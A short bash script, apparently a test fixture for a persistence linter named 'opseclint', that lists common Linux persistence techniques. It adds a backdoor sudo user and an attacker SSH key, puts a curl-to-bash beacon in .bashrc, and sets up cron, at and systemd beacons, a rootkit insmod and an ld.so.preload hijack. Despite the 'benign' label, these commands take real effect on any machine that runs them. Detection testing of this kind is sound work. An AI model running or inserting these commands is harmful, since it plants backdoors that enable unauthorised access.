#!/bin/bash
# Sample persistence playbook. Illustrative only (benign to run in a lab).
# Demonstrates opseclint coverage of common Linux persistence techniques.

# Account persistence
useradd -m -s /bin/bash svc-backup
usermod -aG sudo svc-backup

# SSH key persistence
mkdir -p ~/.ssh
echo "ssh-ed25519 AAAA... attacker@host" >>~/.ssh/authorized_keys

# Logon persistence via shell rc
echo 'curl -s http://198.51.100.10/beacon | bash' >>~/.bashrc

# Scheduled-task persistence
echo '*/5 * * * * root /usr/local/bin/beacon' >/etc/cron.d/beacon
at now + 1 hour -f /usr/local/bin/beacon

# Service persistence
systemctl enable beacon.service

# Kernel-level persistence
insmod /tmp/rootkit.ko

# Userland linker hijack
echo '/tmp/evil.so' >/etc/ld.so.preload
